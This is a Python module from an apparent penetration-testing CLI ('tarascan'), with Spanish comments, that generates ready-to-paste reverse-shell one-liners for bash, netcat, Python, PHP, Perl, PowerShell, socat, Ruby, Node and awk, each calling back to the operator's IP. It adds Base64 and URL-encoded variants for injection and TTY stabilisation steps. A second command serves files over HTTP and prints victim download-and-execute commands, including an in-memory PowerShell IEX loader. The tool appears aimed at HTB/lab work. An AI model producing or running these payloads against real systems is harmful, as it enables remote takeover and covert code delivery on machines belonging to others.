"""Reverse shells con tu IP ya puesta (shell) y servidor HTTP de transferencia (serve)."""

import argparse
import base64
import os
import socket
import subprocess
import urllib.parse

from tarascan import ui


def detect_lhost() -> str:
    """IP local para el atacante: prioriza tun0 (VPN de HTB/lab) sobre la LAN."""
    # 1) tun0 explícito
    try:
        out = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", "tun0"],
            capture_output=True, text=True, timeout=5,
        ).stdout
        for tok in out.split():
            if "/" in tok and tok.count(".") == 3:
                return tok.split("/")[0]
    except (FileNotFoundError, subprocess.SubprocessError):
        pass
    # 2) ruta por defecto (truco del socket UDP, no envía nada)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.10.10.10", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "TU_IP"


def _shells(lhost: str, lport: int) -> list[tuple[str, str]]:
    return [
        ("Bash TCP", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        ("Bash (UDP)", f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1"),
        ("Python3 pty",
         f"python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));"
         f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"),
        ("nc (mkfifo)", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
        ("nc -e", f"nc -e /bin/bash {lhost} {lport}"),
        ("PHP", f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        ("Perl", f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                 f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                 f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"),
        ("PowerShell",
         f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
         f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
         f"{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
         f"$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}\""),
        ("Socat", f"socat TCP:{lhost}:{lport} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"),
        ("Ruby", f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
        ("Node.js", f"node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\")'"),
        ("awk", f"awk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";while(1){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline) > 0)print $0 |& s;close(c)}}}}while(c!=\"exit\")close(s)}}}}' /dev/null"),
    ]


def cmd_shell(argv: list[str]) -> int:
    p = argparse.ArgumentParser(prog="tarascan shell", description="one-liners de reverse shell listos para pegar")
    p.add_argument("-p", "--port", type=int, default=4444, help="puerto de escucha (por defecto 4444)")
    p.add_argument("-l", "--lhost", help="tu IP (por defecto se detecta de tun0 o la ruta por defecto)")
    p.add_argument("--b64", action="store_true", help="añade versión Base64 (payloads que rompen por comillas)")
    p.add_argument("--url", action="store_true", help="añade versión URL-encoded (LFI/RCE web)")
    args = p.parse_args(argv)

    lhost = args.lhost or detect_lhost()
    ui.rule(f"reverse shells · [{ui.PURPLE}]{lhost}:{args.port}[/]")
    ui.console.print(
        f"  [{ui.GREY}]escucha primero con:[/] [{ui.ORANGE}]nc -lvnp {args.port}[/]  "
        f"[{ui.GREY}](o rlwrap nc -lvnp {args.port} para historial)[/]\n"
    )

    shells = _shells(lhost, args.port)
    t = ui.table("Tipo", "One-liner")
    for name, cmd in shells:
        t.add_row(ui.Text(name, style=ui.PURPLE), cmd)
    ui.panel("Reverse shells", "lanza uno en la víctima; tu IP ya va rellenada", [t], border=ui.ORANGE)

    bash_payload = shells[0][1]
    if args.b64:
        enc = base64.b64encode(bash_payload.encode()).decode()
        ui.panel("Base64", "para inyecciones que rompen por espacios/comillas", [
            ui.Text(f"echo {enc} | base64 -d | bash", style=ui.ORANGE),
        ])
    if args.url:
        ui.panel("URL-encoded", "para meterlo en un parámetro web (LFI/RCE)", [
            ui.Text(urllib.parse.quote(bash_payload), style=ui.ORANGE),
        ])

    # Estabilización de TTY: lo primero que haces nada más coger la shell en HTB.
    ui.panel("Estabilizar la shell (TTY)", "una vez tengas la reverse shell, para tener pestañas, Ctrl-C y autocompletado", [
        ui.dim("1) en la víctima, una shell con pty:"),
        ui.Text("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", style=ui.ORANGE),
        ui.dim("   (o: script -qc /bin/bash /dev/null)"),
        ui.dim("2) Ctrl-Z para volver a tu máquina, y ahí:"),
        ui.Text("stty raw -echo; fg", style=ui.ORANGE),
        ui.dim("   (pulsa Enter un par de veces)"),
        ui.dim("3) de vuelta en la shell:"),
        ui.Text("export TERM=xterm; export SHELL=/bin/bash", style=ui.ORANGE),
        ui.note("ajusta el tamaño (mira el tuyo con 'stty size' en otra terminal): stty rows 50 cols 200"),
    ])
    return 0


def cmd_serve(argv: list[str]) -> int:
    p = argparse.ArgumentParser(prog="tarascan serve", description="servidor HTTP + comandos de descarga en la víctima")
    p.add_argument("port", nargs="?", type=int, default=8000, help="puerto (por defecto 8000)")
    p.add_argument("-l", "--lhost", help="tu IP (por defecto autodetectada)")
    p.add_argument("--no-serve", action="store_true", help="solo imprime los comandos, no arranca el servidor")
    args = p.parse_args(argv)

    lhost = args.lhost or detect_lhost()
    cwd = os.getcwd()
    ui.rule(f"servidor de transferencia · [{ui.PURPLE}]http://{lhost}:{args.port}/[/]")

    cmds = [
        ("Linux wget", f"wget http://{lhost}:{args.port}/ARCHIVO -O /tmp/ARCHIVO"),
        ("Linux curl", f"curl http://{lhost}:{args.port}/ARCHIVO -o /tmp/ARCHIVO"),
        ("Win certutil", f"certutil -urlcache -split -f http://{lhost}:{args.port}/ARCHIVO ARCHIVO"),
        ("Win PowerShell", f"powershell -c \"iwr http://{lhost}:{args.port}/ARCHIVO -OutFile ARCHIVO\""),
        ("Win (memoria)", f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{args.port}/ARCHIVO')\""),
    ]
    t = ui.table("Víctima", "Comando de descarga")
    for name, cmd in cmds:
        t.add_row(ui.Text(name, style=ui.PURPLE), cmd)
    ui.panel("Descarga en la víctima", f"sirviendo {cwd}", [t], border=ui.ORANGE)

    if args.no_serve:
        ui.console.print(f"[{ui.GREY}]arranca el servidor tú con:[/] [{ui.ORANGE}]python3 -m http.server {args.port}[/]")
        return 0

    ui.console.print(f"[{ui.ORANGE}]Sirviendo {cwd} en http://{lhost}:{args.port}/ [/][{ui.GREY}](Ctrl-C para parar)[/]\n")
    try:
        subprocess.run(["python3", "-m", "http.server", str(args.port)], check=False)
    except KeyboardInterrupt:
        ui.console.print(f"\n[{ui.GREY}]servidor detenido[/]")
    except FileNotFoundError:
        ui.error("no se encontró python3 para levantar el servidor")
        return 1
    return 0
